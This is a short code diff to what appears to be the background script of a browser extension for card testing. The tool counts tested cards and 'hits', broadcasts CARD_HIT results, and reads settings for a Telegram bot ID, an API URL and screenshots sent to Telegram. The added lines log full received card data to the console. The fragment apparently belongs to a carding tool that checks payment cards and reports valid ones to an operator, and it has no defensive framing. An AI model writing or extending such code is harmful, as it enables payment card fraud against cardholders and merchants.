@@ -305,6 +305,9 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
       broadcastToPopups(hitData);
       broadcastToTabs(hitData, sender?.tab?.id);
       broadcastToTabs({ type: 'STATS_UPDATE', attempts: state.stats.tested, hits: state.stats.hits }, sender?.tab?.id);
+
+      // Debug logging for card data
+      console.log('[CARD_HIT] Card data received:', msg.card, 'Full msg:', msg);
       chrome.storage.local.get(['ax_tg_id', 'ax_tg_name', 'ax_api_url', 'ax_auto_screenshot', 'ax_screenshot_tg', 'ax_tg_hits', 'ax_fill_email'], (r) => {
         const base = (r.ax_api_url || (typeof TGConfig !== 'undefined' ? TGConfig.BOT_URL : 'http://localhost:3000')).replace(/\/$/, '');
         if (!r.ax_tg_id || !base) {
